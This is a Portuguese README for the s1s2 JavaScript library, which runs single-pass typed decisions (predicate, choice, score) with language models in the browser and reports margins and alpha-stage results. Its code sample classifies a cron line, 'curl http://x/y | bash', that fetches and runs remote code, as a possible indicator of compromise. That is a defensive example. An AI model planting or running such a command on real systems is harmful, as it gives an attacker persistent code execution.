# s1s2

[English](README.md)

Decisões tipadas numa só passada de um modelo de linguagem, no navegador, com a probabilidade e a margem de cada resposta. Quando você quer uma explicação, o mesmo modelo gera texto com os mesmos pesos.

```js
import { S12 } from "s1s2";

const kk = await S12.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // escolhe o runtime do aparelho
const s = await kk.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
  // evidence: { requirement: "..." },  // pacotes com head de evidência: s.evidence = a frase que mostra
});
const { probability, margin } = s.answers[0];                // P(verdadeiro) e p(1º) - p(2º)
const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // mesmos pesos
await s.dispose(); await kk.dispose();
```

## O que é

- Uma biblioteca JavaScript que responde perguntas `predicate`, `choice` e `score` numa só passada, sem gerar texto. Cada resposta traz `probability`, `confidence`, `margin` e `rawMargin`.
- `s.generate()` continua do mesmo prefill que produziu a decisão, nos backends que guardam estado.
- Uma política de margem opcional manda as respostas de margem baixa para outro build do mesmo modelo (por exemplo, de int4 para int8) ou para a geração. Não há limiar padrão: você mede o seu no seu build.
- Runtimes: ONNX Runtime Web (grafos GenAI e decoders comuns), transformers.js, WebLLM e LiteRT.js. No Node, onnxruntime-node.
- Lê **pacotes S1S2**: um manifesto que fixa cada arquivo por sha256 e descreve o layout do prompt, os marcadores, as leituras e os heads. A biblioteca e o formato têm o mesmo nome; o formato está especificado em [`spec/`](spec/s1s2-package.md).
- Formatos de head que lê: Kev `head.pt`, heads de decisão em GGUF, alias3-web `head.bin`, leituras lineares d3/pplx, JEV, `DecisionConfig` do transformers e heads conjuntos Clef. [`converters/heads/`](converters/heads) converte cada um deles e grava um registro de fidelidade contra o código de referência do próprio formato.

## Estado: alfa

O que foi medido, em rodadas pré-registradas dos estudos do lab-s12. Os relatórios ainda não foram publicados.

- A margem aponta as decisões que o int4 troca em relação ao bf16 (8 de 8 cenários).
- Mandar para int8 os 15% de respostas com menor margem pega mais dessas trocas que escolher ao acaso (5 de 6 cenários; não no SmolLM2-135M). Há pouca acurácia em jogo: de −0,1 a +2,7 pontos.
- O ponteiro de evidência acha a frase certa melhor que regras que ignoram o conteúdo (6 de 6 e 4 de 4 cenários). Contra a citação gerada pelo modelo, o resultado é misto: em contratos a citação gerada venceu 3 de 4.
- Nos pesos reais do CT0, `decide()` coincide com o `askMany()` do ct0-edge até 4e-16. Os 172 prompts de teste do ct0-edge são reproduzidos de forma exata.
- Cada conversão de formato de head tem registro de fidelidade: [spec §11](spec/s1s2-package.md#11-coverage-formats--conversion--fidelity).

O que não foi medido, ou não se sustentou:

- A decisão numa passada **não** é mais robusta ao int4 que a resposta gerada. Ela também não venceu o JSON com gramática em modelos de até 1,7B.
- Mandar as respostas de margem baixa para a geração foi medido uma vez, de forma exploratória: não ajudou nos itens de leis de privacidade e ajudou em contratos (ContractNLI), mas a tarefa e a divisão dos dados mudaram juntas, então não dá para separar as duas causas.
- O ponteiro de evidência em grafos int4 no navegador foi visto só em dados de desenvolvimento.
- Bytes baixados e latência da escalada não foram medidos. Nenhum tipo de head e nenhuma definição de confiança é recomendada ainda (TBD na spec).
- Alguns pacotes convertidos não rodam no s1s2 0.1: os de atenção não causal, os de templates Jinja e os que leem camadas intermediárias. Os heads Clef são lidos, mas o `decide()` não os usa.

Referência da API e do manifesto: [`docs/reference.md`](docs/reference.md). Padrões e suas evidências: [`docs/system1-on-device-patterns.md`](docs/system1-on-device-patterns.md). Ambos em inglês.

Outros projetos já fazem decisão tipada numa passada, entre eles o open-jev, o exemplo de decisão do wllama, o `tasks-decision` do MediaPipe e o `NonGenerativeSession` do ONNX Runtime GenAI. Mandar entradas de margem baixa para mais precisão já aparece na literatura, por exemplo em arXiv [2609.24322](https://arxiv.org/abs/2609.24322) e [2611.14418](https://arxiv.org/abs/2611.14418).

## Estrutura

- [`src/`](src): a biblioteca. `npm test` roda typecheck, build e testes de unidade. Os testes usam mocks e não baixam modelo.
- [`spec/`](spec): a spec do pacote S1S2 (0.2-draft) e o JSON Schema. `node bin/s1s2.mjs validate <pacote>` confere um pacote.
- [`converter/`](converter/README.md): transforma um modelo do Hugging Face e um JSONL rotulado num pacote. Em Python.
- [`converters/heads/`](converters/heads): converte formatos de head publicados em pacotes.
- [`examples/`](examples): um verificador de política de privacidade que roda no aparelho. Os builds do SmolLM2 não estão publicados; sirva-os localmente com `serve.mjs --mirror`.
- [`manifests/`](manifests): manifestos fixados do CT0 (alias3-micro-1026, builds públicos) e do SmolLM2-135M (builds locais, não publicados).

## Créditos

A divisão Sistema 1 / Sistema 2 e a ideia do portão de margem vêm do CT0, da Alias Robotics. Este código nasceu no [ct0-edge](https://github.com/eduardoworrel/ct0-edge).
O head de ponteiro e a receita de treino que o lab seguiu, com o aumento de dados, vêm do [Kev](https://github.com/jaredpalmer/kev) (Apache-2.0); o conversor porta o head, não o aumento de dados. A codificação KEV vem do [open-jev](https://github.com/nico-martin/open-jev) (MIT). Veja [`NOTICE`](NOTICE).

## Licença

MIT ([`LICENSE`](LICENSE)). O código de terceiros mantém a própria licença ([`NOTICE`](NOTICE)). Pesos e heads mantêm a licença da origem.
